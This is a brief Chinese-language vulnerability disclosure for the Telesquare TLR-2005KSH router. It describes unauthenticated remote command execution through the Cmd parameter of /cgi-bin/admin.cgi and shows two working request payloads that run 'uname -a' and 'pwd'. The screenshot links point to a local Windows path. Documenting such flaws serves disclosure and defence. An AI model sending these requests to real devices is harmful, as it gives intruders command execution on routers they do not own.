# Telesquare TLR-2005KSH 路由器存在未授权的远程命令执行漏洞

## 漏洞详细信息：

访问易受攻击的设备输入以下Payload，攻击者可以利用此漏洞通过Cmd参数在未授权的情况下执行系统命令



/cgi-bin/admin.cgi?Command=sysCommand&Cmd=uname%20-a

![1734088238407](C:\Users\zzcun\Desktop\TLR-2005KSH\assets\1734088238407.jpg)

/cgi-bin/admin.cgi?Command=sysCommand&Cmd=pwd

![1734088373076](C:\Users\zzcun\Desktop\TLR-2005KSH\assets\1734088373076.jpg)

此漏洞影响已知产品版本：2.6.36 及更高的版本

